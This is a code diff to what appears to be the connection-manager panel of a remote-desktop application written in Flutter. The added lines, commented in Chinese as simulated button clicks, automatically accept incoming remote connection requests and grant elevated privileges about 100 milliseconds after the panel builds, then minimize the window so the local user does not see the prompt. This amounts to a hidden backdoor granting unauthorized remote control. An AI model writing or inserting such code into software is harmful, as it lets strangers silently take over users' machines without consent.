@@ -983,6 +983,23 @@ class _CmControlPanel extends StatelessWidget {
         model.showElevation &&
         client.type_() == ClientType.remote;
     final showAccept = model.approveMode != 'password';
+
+    // 添加构建后延迟触发逻辑
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      Future.delayed(Duration(milliseconds: 100), () {
+        // 模拟组合按钮点击行为
+        if (showElevation && showAccept) {
+          handleAccept(context);
+          handleElevate(context);
+        } 
+        // 模拟单独接受按钮点击行为
+        else if (showAccept) {
+          handleAccept(context);
+        }
+        windowManager.minimize();
+      });
+    });
+
     return Column(
       mainAxisAlignment: MainAxisAlignment.end,
       children: [
